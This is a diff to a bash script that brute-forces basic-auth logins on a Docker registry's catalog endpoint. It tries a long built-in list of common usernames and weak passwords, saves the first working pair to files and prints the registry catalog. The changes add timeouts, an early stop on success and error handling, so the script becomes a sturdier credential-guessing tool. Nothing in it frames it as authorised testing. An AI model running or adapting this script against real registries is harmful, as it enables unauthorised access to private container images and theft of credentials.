@@ -1,17 +1,17 @@
 #!/usr/bin/env bash
-set -eu
+set -euo pipefail
 
 OUTDIR="${1:-$DATA_PATH/KC2}"
 REGISTRY_USER="${2:-$REGISTRY_USER}"
 REGISTRY_PASS="${3:-$REGISTRY_PASS}"
 HOSTREGISTRY="${4:-$HOSTREGISTRY}"
+CATALOG_URL="https://$HOSTREGISTRY/v2/_catalog"
 
 USERNAMES="admin administrator user test guest info root sysadmin support service manager operator developer webmaster \
 administrator1 admin1 user1 test1 guest1 root1 demo demo1 student teacher office ftp oracle mysql postgres nginx apache db sql \
 ftpuser docker git github gitlab bitbucket jira confluence sftpuser dbadmin shop zabbix nagios cisco juniper sshd hp dell dbuser \
 ibm lenovo microsoft windows linux ubuntu debian centos redhat fedora suse arch kali aws azure gcp cloud signal icloud devops ssh \
-ci cd build runner agent worker node server client api apiuser bot bot1 robot service1 service2 proxy proxy1 proxy2 vpn vpn1 vpn2 \
-$REGISTRY_USER"
+ci cd build runner agent worker node server client api apiuser bot bot1 robot service1 service2 proxy proxy1 proxy2 vpn vpn1 vpn2 $REGISTRY_USER"
 
 PASSWORDS="123456 123456789 qwerty password 111111 12345678 abc123 1234567 password1 12345 1234567890 123123 000000 iloveyou 1234 \
 1q2w3e4r5t qwertyuiop 123 monkey dragon 123456a 654321 123321 666666 1qaz2wsx myspace1 121212 123qwe a123456 123abc 1q2w3e4r \
@@ -20,18 +20,47 @@ qwe123 7777777 qwerty123 target123 tinkle 987654321 qwerty1 222222 zxcvbnm 1g2w3
 777777 123654 11111 asdfgh 999999 11111111 passer2009 888888 love abcd1234 shadow football1 love123 superman jessica monkey1 \
 12qwaszx a12345 baseball 123456789a killer asdf samsung master azerty charlie asd123 soccer fqrg7cs493 88888888 jordan $REGISTRY_PASS"
 
+catalog_code() {
+  local user="$1"
+  local pass="$2"
+
+  curl -sk --connect-timeout 5 --max-time 15 \
+    -u "$user:$pass" \
+    -o /dev/null \
+    -w '%{http_code}' \
+    "$CATALOG_URL"
+}
+
 mkdir -p "${OUTDIR}"
+found=0
+attempt=0
+
 for user in $USERNAMES; do
   for pass in $PASSWORDS; do
-    code=$(curl -sk -u "$user:$pass" -o /dev/null -w '%{http_code}' https://$HOSTREGISTRY/v2/_catalog)
+    attempt=$((attempt + 1))
+    if code="$(catalog_code "$user" "$pass")"; then
+      :
+    else
+      rc=$?
+      echo "[WARN] registry probe failed at attempt ${attempt} for user '${user}' (rc=${rc})" >&2
+      continue
+    fi
+
     if [ "$code" -eq 200 ]; then
-      echo "$pass" > $OUTDIR/pass
-      echo "$user" > $OUTDIR/user
+      echo "$pass" > "$OUTDIR/pass"
+      echo "$user" > "$OUTDIR/user"
       echo "Credentials: $user - $pass"
-      curl -ku "$user:$pass" https://$HOSTREGISTRY/v2/_catalog
+      curl -sku "$user:$pass" --connect-timeout 5 --max-time 15 "$CATALOG_URL"
+      found=1
+      break 2
     fi
   done
 done
+
+if [ "$found" -ne 1 ]; then
+  echo "No valid registry credentials found for $HOSTREGISTRY" >&2
+  exit 1
+fi
 
 # It is usefull to build docker
 sysctl -w net.ipv4.ip_forward=1
